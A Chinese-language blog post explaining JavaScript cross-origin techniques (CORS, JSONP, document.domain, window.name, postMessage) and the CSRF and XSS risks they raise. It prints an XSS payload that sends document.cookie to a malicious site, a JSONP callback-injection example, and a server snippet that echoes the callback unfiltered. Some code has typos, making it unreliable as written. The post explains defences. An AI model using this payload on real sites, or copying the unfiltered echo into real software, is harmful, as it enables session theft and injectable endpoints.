---
layout: post
title: 浅谈js跨域问题
date: 2015-09-23
author: "Jenny"
tags: [javascript,xss,csrf,跨域]
---

> 所谓跨域，或者异源，是指主机名（域名）、协议、端口号只要有其一不同，就为不同的域（或源）。浏览器中有一个基本的策略，叫同源策略，即限制“源”自A的脚本只能操作“同源”页面的DOM。

先聊一下w3c的***CORS规范***：
> CORS旨在定义一种规范让浏览器在接收到从提供者获取资源时能够决定是否应该将此资源分发给消费者作进一步处理。

具体如下：

1. 消费者发送一个Origin报头到提供者端：`Origin: http://www.a.com`；

2. 提供者发送一个Access-Control-Allow-Origin响应报头给消费者，如果值为*或Origin对应的站点，则表示同意共享资源给消费者，如果值为null或者不存在Access-Control-Allow-Origin报头，则表示不同意共享资源给消费者；

3. 浏览器根据提供者的响应报文判断是否允许消费者跨域访问到提供者源。

要解决跨域的问题，有以下几种方法：

1. 通过Jsonp跨域

对于一段JavaScript脚本来说，其“源”与它存储的地址无关，而取决于脚本被加载的页面，例如我们在页面中使用<script>引入存储在其他域的脚本文件：

`<script src="http://www.a.com/index.js"></script>`

这里脚本与当前页面是同源的。除了<script>，还有<img>、<iframe>、<link>等都具有跨域加载资源的能力。

Jsonp正是利用这种特性来实现跨域的：在页面中引入要跨域访问的来源，并定义回调函数处理跨域访问得到的json数据。如：

```
<script>
function handleData(data) {
    //处理数据
}
</script>
<script src="http://www.a.com/getData.do?callback=handleData"></script>
```

也可以使用jquery封装的方法，如$.ajax:

```
<script>
function hadnleData(data) {
    //处理数据
}
$.ajax({
    url: 'http://www.a.com/getData.do?callback=?',
    type: "GET",
    dataType: "jsonp",
    jsonpCallback: "handleData"
});
</script>
```

当然还需要服务端配合处理：

```
String handleData = request.getParameter("callback");//客户端的回调函数
out.println(handleData+"("+resultJSON+")");//返回jsonp格式数据
```

2. 修改document.domain来跨子域

www.a.com/1.html和a.com/2.html是不同域的，要使他们可以跨域访问，可通过修改document.domain来实现，即在两个页面中都设置：

`document.domain="a.com";`

需要注意的是document.domain只能往父级修改，如a.com改为www.a.com是不被允许的，这也是此方法的局限性，只使用于跨子域访问。

3. 使用window.name来跨域访问

window.name是同一浏览器窗口下载入的所有页面共享的数据字段，所有窗口都可以读写此字段的内容。所以假设a.com要访问b.com的数据，只需要在b.com中将数据放在window.name中，然后a.com从中取出即可。此方法适用于像iframe这样的嵌套页面架构。

4. 使用HTML5的window.postMessage方法

假设要在a.com和b.com页面之间传递数据：

```
//a.com页面
window.postMesssage(JSON.stringify({xxx:'test'},'b.com');
//b.com页面
window.onMessage=function(e){
    var data = JSON.parse(e.data);
    console.log(data); //{xxx:'test'}
}
```

下面谈一下跨域访问的一些安全性问题，主要是CSRF和XSS攻击问题。

1. CSRF/XSRF攻击

网上找到一个大神发的图，贴在这里观摩观摩：

![](/img/cross-domain/1.png)

其实就是危险网站B在自己网站上贴了网站A的某个接口链接（a标签或form提交是支持跨域的），引导用户点击（骗取用户cookie）去访问网站A，祸因在于用户登录了A在不注销的情况下登录了B。解决方法有很多，如验证码，表单附加随机数等，原理基本都是校验登录方的请求令牌。

如果使用跨域访问可以更简单的进行CSRF攻击（当然也有相应的防范措施），当某网站通过JSONP方式来跨域传递用户认证后的敏感信息时，攻击者可以构造恶意的JSONP调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。（这里有一个微博股吧CSRF攻击的[例子](https://www.91ri.org/13407.html)）

目前比较好的防止CSRF攻击的方法是***referer过滤校验+token验证***，即服务端检测JSON文件调用来源和检查token数据是否匹配。

2. XSS攻击（XSS注入）

此攻击方法类似sql注入，即提交含有恶意脚本的数据到服务器，从而达到破坏页面甚至盗取cookie伪装登录等目的。例如，在a.com/index.ftl中有如下代码：`欢迎你，${username}`，这时恶意网站b.com传递参数：

`username=<script>window.open(“www.b.com?param=”+document.cookie)</script>`

这样就轻而易举地盗取了用户的cookie值了。

在jsonp跨域访问中，xss注入主要是callback参数注入，如：

`<script src="http://www.a.com/getData.do?callback=<script>alert('xss');</script>"></script>`

防止措施是对参数进行校验过滤。
